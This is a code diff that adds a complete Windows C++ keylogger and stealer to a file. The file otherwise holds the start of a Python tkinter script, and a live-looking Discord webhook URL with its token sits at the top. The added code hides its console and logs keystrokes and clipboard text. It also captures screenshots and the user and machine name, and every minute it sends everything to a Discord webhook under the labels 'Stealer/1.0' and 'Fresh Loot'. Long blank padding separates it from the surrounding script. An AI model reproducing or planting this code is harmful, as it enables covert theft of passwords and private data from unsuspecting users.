@@ -1,6 +1,259 @@
 https://discord.com/api/webhooks/1420479039973490803/wAOLMbEAm-TVcAI61OSBb7YXzq-lzJzf4sPwde8XHjnuoQtiaMeN3Kwr29OI7AEqp4yO
 
 
+
+
+#include <windows.h>
+#include <winhttp.h>
+#include <iostream>
+#include <fstream>
+#include <string>
+#include <sstream>
+#include <vector>
+
+#pragma comment(lib, "winhttp.lib")
+
+// === CHANGE THIS ONE LINE ONLY ===
+const std::wstring DISCORD_WEBHOOK = L"https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN";
+// =================================
+
+const int EXFIL_INTERVAL_MS = 60000;  // 60 seconds (change to 10000 for fast testing)
+
+void HideConsole() {
+    HWND hwnd = GetConsoleWindow();
+    if (hwnd) ShowWindow(hwnd, SW_HIDE);
+}
+
+std::string GetSystemInfo() {
+    std::stringstream ss;
+    char username[256], computer[256];
+    DWORD size = 256;
+    GetUserNameA(username, &size);
+    size = 256;
+    GetComputerNameA(computer, &size);
+    ss << "Username: " << username << "\n";
+    ss << "Computer: " << computer << "\n";
+    return ss.str();
+}
+
+void LogKey(int key) {
+    std::ofstream log("keys.log", std::ios::app);
+    if (log.is_open()) {
+        if (key == VK_SPACE) log << " ";
+        else if (key == VK_RETURN) log << "\n[ENTER]\n";
+        else if (key == VK_BACK) log << "[BACKSPACE]";
+        else if (key == VK_TAB) log << "[TAB]";
+        else if (key >= 'A' && key <= 'Z') log << (char)key;
+        else if (key >= '0' && key <= '9') log << (char)key;
+        else if (key >= VK_F1 && key <= VK_F24) log << "[F" << (key - VK_F1 + 1) << "]";
+        log.close();
+    }
+}
+
+std::string lastClip = "";
+void CheckClipboard() {
+    if (OpenClipboard(NULL)) {
+        HANDLE hData = GetClipboardData(CF_TEXT);
+        if (hData) {
+            char* text = (char*)GlobalLock(hData);
+            if (text) {
+                std::string current(text);
+                if (current != lastClip && !current.empty()) {
+                    std::ofstream clip("clip.log", std::ios::app);
+                    clip << "[CLIPBOARD] " << current << "\n\n";
+                    clip.close();
+                    lastClip = current;
+                }
+                GlobalUnlock(hData);
+            }
+        }
+        CloseClipboard();
+    }
+}
+
+void TakeScreenshot() {
+    HDC hScreen = GetDC(NULL);
+    int width = GetDeviceCaps(hScreen, HORZRES);
+    int height = GetDeviceCaps(hScreen, DESKTOPVERTRES);
+
+    HDC hCompat = CreateCompatibleDC(hScreen);
+    HBITMAP hBmp = CreateCompatibleBitmap(hScreen, width, height);
+    SelectObject(hCompat, hBmp);
+    BitBlt(hCompat, 0, 0, width, height, hScreen, 0, 0, SRCCOPY);
+
+    BITMAPINFOHEADER bi = {sizeof(BITMAPINFOHEADER), width, height, 1, 24};
+    std::vector<BYTE> buffer(width * height * 3);
+    GetDIBits(hCompat, hBmp, 0, height, buffer.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS);
+
+    std::ofstream file("screenshot.bmp", std::ios::binary);
+    BITMAPFILEHEADER bf = {0x4D42, (DWORD)(sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + buffer.size()), 0, 0, sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER)};
+    file.write((char*)&bf, sizeof(bf));
+    file.write((char*)&bi, sizeof(bi));
+    file.write((char*)buffer.data(), buffer.size());
+    file.close();
+
+    DeleteObject(hBmp);
+    DeleteDC(hCompat);
+    ReleaseDC(NULL, hScreen);
+}
+
+std::string CollectData() {
+    std::stringstream data;
+    data << GetSystemInfo() << "\n";
+
+    std::ifstream keys("keys.log");
+    if (keys) { data << "=== KEYLOG ===\n" << keys.rdbuf() << "\n"; }
+
+    std::ifstream clip("clip.log");
+    if (clip) { data << "=== CLIPBOARD HISTORY ===\n" << clip.rdbuf() << "\n"; }
+
+    return data.str();
+}
+
+void ExfiltrateToDiscord() {
+    std::string payload = CollectData();
+    if (payload.empty() && GetFileAttributesA("screenshot.bmp") == INVALID_FILE_ATTRIBUTES) return;
+
+    std::vector<char> screenshotData;
+    std::ifstream screenshotFile("screenshot.bmp", std::ios::binary | std::ios::ate);
+    if (screenshotFile) {
+        size_t size = screenshotFile.tellg();
+        screenshotFile.seekg(0);
+        screenshotData.resize(size);
+        screenshotFile.read(screenshotData.data(), size);
+    }
+
+    HINTERNET hSession = WinHttpOpen(L"Stealer/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) return;
+
+    URL_COMPONENTS urlComp = { sizeof(URL_COMPONENTS) };
+    urlComp.dwHostNameLength = (DWORD)-1;
+    urlComp.dwUrlPathLength = (DWORD)-1;
+    WinHttpCrackUrl(DISCORD_WEBHOOK.c_str(), 0, 0, &urlComp);
+
+    std::wstring host(urlComp.lpszHostName, urlComp.dwHostNameLength);
+    std::wstring path(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);
+    if (urlComp.lpszExtraInfo) path += urlComp.lpszExtraInfo;
+
+    HINTERNET hConnect = WinHttpConnect(hSession, host.c_str(), urlComp.nPort, 0);
+    if (!hConnect) { WinHttpCloseHandle(hSession); return; }
+
+    DWORD flags = (urlComp.nPort == 443) ? WINHTTP_FLAG_SECURE : 0;
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
+    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return; }
+
+    std::string boundary = "----GrokBoundary42069";
+    std::string contentType = "multipart/form-data; boundary=" + boundary;
+
+    std::stringstream body;
+    body << "--" << boundary << "\r\n";
+    body << "Content-Disposition: form-data; name=\"payload_json\"\r\n\r\n";
+    body << "{\n";
+    body << "  \"username\": \"Victim\",\n";
+    body << "  \"embeds\": [{\n";
+    body << "    \"title\": \"Fresh Loot\",\n";
+    body << "    \"description\": \"";
+
+    for (char c : payload) {
+        if (c == '"') body << "\\\"";
+        else if (c == '\n') body << "\\n";
+        else if (c == '\r') continue;
+        else if (c == '\\') body << "\\\\";
+        else body << c;
+    }
+
+    body << "\",\n";
+    body << "    \"color\": 16711680\n";
+    body << "  }]\n";
+    body << "}\r\n";
+
+    if (!screenshotData.empty()) {
+        body << "--" << boundary << "\r\n";
+        body << "Content-Disposition: form-data; name=\"file\"; filename=\"screenshot.bmp\"\r\n";
+        body << "Content-Type: image/bmp\r\n\r\n";
+        body.write(screenshotData.data(), screenshotData.size());
+        body << "\r\n";
+    }
+
+    body << "--" << boundary << "--\r\n";
+    std::string bodyStr = body.str();
+
+    std::wstring wHeaders = std::wstring(contentType.begin(), contentType.end()) + L"\r\n";
+
+    WinHttpSendRequest(hRequest, wHeaders.c_str(), wHeaders.length(),
+                       (LPVOID)bodyStr.data(), (DWORD)bodyStr.length(), (DWORD)bodyStr.length(), 0);
+
+    WinHttpReceiveResponse(hRequest, NULL);
+
+    WinHttpCloseHandle(hRequest);
+    WinHttpCloseHandle(hConnect);
+    WinHttpCloseHandle(hSession);
+}
+
+int main() {
+    HideConsole();
+
+    // Initial grab
+    TakeScreenshot();
+    ExfiltrateToDiscord();
+
+    DWORD lastExfil = GetTickCount();
+
+    while (true) {
+        for (int key = 8; key <= 255; key++) {
+            if (GetAsyncKeyState(key) == -32767) {
+                LogKey(key);
+            }
+        }
+        CheckClipboard();
+
+        if (GetTickCount() - lastExfil > EXFIL_INTERVAL_MS) {
+            TakeScreenshot();  // Fresh screenshot each exfil
+            ExfiltrateToDiscord();
+            lastExfil = GetTickCount();
+        }
+
+        Sleep(50);
+    }
+
+    return 0;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 import os
 import subprocess
 import tkinter as tk
